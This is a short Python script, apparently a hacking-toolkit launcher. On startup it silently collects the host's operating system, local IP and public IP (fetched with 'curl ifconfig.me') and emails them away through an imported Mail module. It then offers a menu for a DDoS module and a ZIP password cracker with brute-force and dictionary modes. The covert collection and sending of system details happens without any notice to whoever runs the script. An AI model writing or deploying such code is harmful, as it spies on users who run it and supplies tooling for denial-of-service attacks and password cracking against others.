import sys
import socket
import subprocess
import Mail

platform = sys.platform
#print(platform)
localIp = socket.gethostbyname(socket.gethostname())
#print(localIp)
cmdCommand = "curl ifconfig.me"
process = subprocess.Popen(cmdCommand.split(), stdout=subprocess.PIPE)
globalIp, error = process.communicate()
#print(globalIp)
AllInfo = "\n Betriebssystem: " + platform + "\n Lokale IP Adresse: " + localIp + "\n Globale IP Adresse: " + str(globalIp)
#print(AllInfo)

Mail.send_email(Mail.subject, AllInfo)

def select():
    selectionProg = int(input("\n 1=DDoS \n 2=ZipCracker: "))
    if selectionProg == 1:
        import DDoS
        DDoS.start()
    elif selectionProg == 2:
        import ZipCracker
        selectionZip = int(input("\n 1=brureforce \n 2=dictionary: "))
        if selectionZip == 1:
            ZipCracker.bruteforce()
        elif selectionZip == 2:
            ZipCracker.dictionary()
    else:
        select()
select()